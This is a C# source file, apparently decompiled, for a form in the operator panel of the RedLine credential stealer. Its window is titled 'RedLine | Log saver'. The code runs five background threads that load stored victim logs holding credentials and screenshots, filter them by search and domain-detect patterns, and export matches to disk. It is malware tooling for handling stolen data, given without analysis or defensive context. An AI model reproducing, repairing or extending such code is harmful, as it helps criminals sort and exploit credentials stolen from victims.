using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using RedLine.MainPanel.Data.Controllers;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.DbControllers;
using RedLine.MainPanel.LogExt;
using RedLine.MainPanel.Views.Old.Actions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Views;

public class SaveProcessFrm : Form
{
	public List<Thread> _threads;

	private object object_0 = new object();

	private IntPtr intptr_0;

	private IntPtr intptr_1;

	private object object_1;

	private object object_2;

	[CompilerGenerated]
	private object object_3;

	private object object_4;

	private object topHeader;

	private object mainTitle;

	private object a;

	private object b;

	private object c;

	private object d;

	private object e;

	private string[] FileIDS
	{
		[CompilerGenerated]
		get
		{
			return (string[])object_3;
		}
		[CompilerGenerated]
		set
		{
			object_3 = value;
		}
	}

	public SaveProcessFrm(string dir, string _searchPattern = null)
	{
		InitializeComponent();
		_ = base.Handle;
		object_2 = _searchPattern;
		object_1 = dir;
		FileIDS = Directory.GetFiles(LazyLoader<UserLogsDb>.Instance.DataBaseDir);
		intptr_1 = (IntPtr)FileIDS.Count();
		((Control)c).Text = System.Runtime.CompilerServices.Unsafe.As<IntPtr, int>(ref intptr_1).ToString();
		_threads = new List<Thread>();
		for (int i = 0; i < 5; i++)
		{
			_threads.Add(new Thread(TransferLog)
			{
				IsBackground = true,
				Priority = ThreadPriority.Highest
			});
		}
		this.AllowDraggBy((Control)topHeader);
		this.ApplyShadows();
		foreach (Thread thread in _threads)
		{
			thread.Start();
		}
	}

	public void TransferLog()
	{
		try
		{
			int num = 0;
			List<string> domainDetects = ((MainFrm.RemoteClientSettings.DDPatterns == null) ? new List<string>() : MainFrm.RemoteClientSettings.DDPatterns.Cast<string>().ToList());
			while (true)
			{
				try
				{
					lock (object_0)
					{
						num = (int)(nint)intptr_0;
						if (num > (nint)intptr_1)
						{
							break;
						}
						intptr_0 += (nint)1;
					}
					int num2 = Convert.ToInt32(new FileInfo(FileIDS[num]).Name.Split('.')[0]);
					UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(num2);
					if (userLog.IsMatch((string)object_2))
					{
						userLog.Checked = true;
						LazyLoader<UserLogsDb>.Instance.Save(userLog);
						userLog.SaveTo((string)object_1, MainFrm.RemoteClientSettings.SaveAsJSON, domainDetects);
						UserLog temp = userLog;
						temp.Credentials = new Credentials();
						temp.Screenshot = new byte[0];
						int num3 = 0;
						num3 = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == temp.ID);
						LazyLoader<UserLogsDb>.Instance.DbInstance[num3] = temp;
					}
					userLog = default(UserLog);
					if (!base.InvokeRequired)
					{
						((Control)d).Text = ((int)((nint)intptr_0 - 1)).ToString();
						continue;
					}
					Invoke((MethodInvoker)delegate
					{
						((Control)d).Text = ((int)((nint)intptr_0 - 1)).ToString();
					});
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private void topHeader_Paint(object sender, object e)
	{
		int num = ((Control)topHeader).Width - 1;
		int num2 = ((Control)topHeader).Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void SaveProcessFrm_Paint(object sender, object e)
	{
		int num = base.Width - 1;
		int num2 = base.Height - 1;
		Pen pen = new Pen(Color.Red, 3f);
		((PaintEventArgs)e).Graphics.DrawRectangle(pen, 0, 0, num, num2);
	}

	private void a_Click(object sender, object e)
	{
		Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && object_4 != null)
		{
			((IDisposable)object_4).Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RedLine.MainPanel.Views.SaveProcessFrm));
		this.topHeader = new System.Windows.Forms.Panel();
		this.mainTitle = new System.Windows.Forms.Label();
		this.a = new System.Windows.Forms.Label();
		this.b = new System.Windows.Forms.Label();
		this.c = new System.Windows.Forms.Label();
		this.d = new System.Windows.Forms.Label();
		this.e = new System.Windows.Forms.Label();
		((System.Windows.Forms.Control)this.topHeader).SuspendLayout();
		base.SuspendLayout();
		((System.Windows.Forms.Control)this.topHeader).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.mainTitle);
		((System.Windows.Forms.Control)this.topHeader).Controls.Add((System.Windows.Forms.Control)this.a);
		((System.Windows.Forms.Control)this.topHeader).Dock = System.Windows.Forms.DockStyle.Top;
		((System.Windows.Forms.Control)this.topHeader).ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.Control)this.topHeader).Location = new System.Drawing.Point(0, 0);
		((System.Windows.Forms.Control)this.topHeader).Name = "topHeader";
		((System.Windows.Forms.Control)this.topHeader).Size = new System.Drawing.Size(282, 30);
		((System.Windows.Forms.Control)this.topHeader).TabIndex = 3;
		((System.Windows.Forms.Control)this.topHeader).Paint += new System.Windows.Forms.PaintEventHandler(topHeader_Paint);
		((System.Windows.Forms.Control)this.mainTitle).AutoSize = true;
		((System.Windows.Forms.Control)this.mainTitle).Font = new System.Drawing.Font("Segoe UI", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.mainTitle).ForeColor = System.Drawing.Color.Red;
		((System.Windows.Forms.Control)this.mainTitle).Location = new System.Drawing.Point(3, 4);
		((System.Windows.Forms.Control)this.mainTitle).Name = "mainTitle";
		((System.Windows.Forms.Control)this.mainTitle).Size = new System.Drawing.Size(137, 20);
		((System.Windows.Forms.Control)this.mainTitle).TabIndex = 2;
		((System.Windows.Forms.Control)this.mainTitle).Text = "RedLine | Log saver";
		((System.Windows.Forms.Control)this.a).AutoSize = true;
		((System.Windows.Forms.Control)this.a).Font = new System.Drawing.Font("Segoe UI Semibold", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.a).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.a).Location = new System.Drawing.Point(258, 4);
		((System.Windows.Forms.Control)this.a).Name = "closeBtn";
		((System.Windows.Forms.Control)this.a).Size = new System.Drawing.Size(20, 21);
		((System.Windows.Forms.Control)this.a).TabIndex = 1;
		((System.Windows.Forms.Control)this.a).Text = "X";
		((System.Windows.Forms.Control)this.a).Click += new System.EventHandler(a_Click);
		((System.Windows.Forms.Control)this.b).AutoSize = true;
		((System.Windows.Forms.Control)this.b).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.b).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.b).Location = new System.Drawing.Point(30, 58);
		((System.Windows.Forms.Control)this.b).Name = "label1";
		((System.Windows.Forms.Control)this.b).Size = new System.Drawing.Size(78, 21);
		((System.Windows.Forms.Control)this.b).TabIndex = 21;
		((System.Windows.Forms.Control)this.b).Text = "Total logs:";
		((System.Windows.Forms.Control)this.c).AutoSize = true;
		((System.Windows.Forms.Control)this.c).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.c).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.c).Location = new System.Drawing.Point(144, 58);
		((System.Windows.Forms.Control)this.c).Name = "totalLogsLbl";
		((System.Windows.Forms.Control)this.c).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.c).TabIndex = 24;
		((System.Windows.Forms.Control)this.c).Text = "0";
		((System.Windows.Forms.Control)this.d).AutoSize = true;
		((System.Windows.Forms.Control)this.d).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.d).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.d).Location = new System.Drawing.Point(144, 86);
		((System.Windows.Forms.Control)this.d).Name = "currentLogsLbl";
		((System.Windows.Forms.Control)this.d).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.d).TabIndex = 27;
		((System.Windows.Forms.Control)this.d).Text = "0";
		((System.Windows.Forms.Control)this.e).AutoSize = true;
		((System.Windows.Forms.Control)this.e).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.e).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.e).Location = new System.Drawing.Point(30, 86);
		((System.Windows.Forms.Control)this.e).Name = "label3";
		((System.Windows.Forms.Control)this.e).Size = new System.Drawing.Size(89, 21);
		((System.Windows.Forms.Control)this.e).TabIndex = 26;
		((System.Windows.Forms.Control)this.e).Text = "Completed:";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		base.ClientSize = new System.Drawing.Size(282, 132);
		base.Controls.Add((System.Windows.Forms.Control)this.d);
		base.Controls.Add((System.Windows.Forms.Control)this.e);
		base.Controls.Add((System.Windows.Forms.Control)this.c);
		base.Controls.Add((System.Windows.Forms.Control)this.b);
		base.Controls.Add((System.Windows.Forms.Control)this.topHeader);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "SaveProcessFrm";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "RedLine | Saving Process";
		base.Paint += new System.Windows.Forms.PaintEventHandler(SaveProcessFrm_Paint);
		((System.Windows.Forms.Control)this.topHeader).ResumeLayout(false);
		((System.Windows.Forms.Control)this.topHeader).PerformLayout();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	[CompilerGenerated]
	private void method_0()
	{
		((Control)d).Text = ((int)((nint)intptr_0 - 1)).ToString();
	}
}
